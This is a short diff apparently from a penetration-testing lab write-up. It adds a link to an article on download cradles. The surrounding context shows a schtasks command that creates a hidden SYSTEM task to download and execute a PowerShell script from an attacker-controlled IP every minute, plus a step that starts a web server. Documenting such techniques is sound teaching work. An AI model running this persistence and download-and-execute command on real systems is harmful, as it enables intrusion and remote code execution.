@@ -714,6 +714,9 @@ serverName:
     -   `schtasks /create /tn LetMeIn /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((New-Object Net.WebClient).DownloadString(''http://10.10.14.21:9000/script.ps1'''))'" /sc minute /mo 1 /ru System`
     -   {{< figure src="/ox-hugo/2024-11-06-161844_.png" >}}
 
+-   +Deep Dive+: I have a deep dive into download cradles and how they work: 
+    -   https://bloodstiller.com/articles/understandingdownloadcradles/
+
 -   **Start our listener &amp; webserver**:
     -   Webserver:
         -   `python3 -m http.server [port]`
